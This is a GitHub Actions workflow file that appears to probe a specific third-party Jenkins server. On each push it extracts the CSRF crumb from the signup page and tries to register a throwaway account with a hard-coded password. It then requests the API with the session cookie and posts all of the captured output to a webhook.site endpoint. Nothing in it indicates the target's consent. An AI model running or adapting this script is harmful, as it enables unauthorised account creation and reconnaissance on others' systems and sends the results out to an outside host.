name: jsignup
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  jsignup:
    runs-on: ubuntu-latest
    steps:
      - name: Signup
        run: |
          {
            echo "=== GET /signup ==="
            curl -sS -k -m 15 -c /tmp/cj -o /tmp/s.html -w "code=%{http_code} size=%{size_download}\n" https://jenkins.htpl.cc/signup 2>&1
            grep -oiE "sign up|signup|not enabled|username|password1|password2|Jenkins-Crumb[^>]{0,80}" /tmp/s.html 2>/dev/null | sort -u | head -20
            CRUMB=$(grep -oE "name=\"Jenkins-Crumb\" value=\"[^\"]+" /tmp/s.html 2>/dev/null | head -1 | sed "s/.*value=\"//")
            echo "crumb=$CRUMB"
            U="probe$(date +%s)"
            echo "=== POST /signup $U ==="
            curl -sS -k -m 15 -b /tmp/cj -c /tmp/cj -o /tmp/r.html -w "code=%{http_code} size=%{size_download}\n" -X POST https://jenkins.htpl.cc/signup --data-urlencode "username=$U" --data-urlencode "password1=ProbePass123!" --data-urlencode "password2=ProbePass123!" --data-urlencode "fullname=Probe User" --data-urlencode "email=$U@example.com" --data-urlencode "Jenkins-Crumb=$CRUMB" 2>&1
            grep -oiE "error|invalid|already|created|welcome|Sign in|Jenkins-Crumb[^>]{0,60}" /tmp/r.html 2>/dev/null | sort -u | head -10
            echo "=== api with cookie ==="
            curl -sS -k -m 15 -b /tmp/cj -o /tmp/a -w "code=%{http_code} size=%{size_download}\n" https://jenkins.htpl.cc/api/json 2>&1
            head -c 500 /tmp/a
          } > /tmp/out.txt 2>&1
          curl -s -m 20 -X POST "https://webhook.site/09a21973-c41f-45f2-acea-287b74444e73" -H "Content-Type: text/plain" --data-binary @/tmp/out.txt
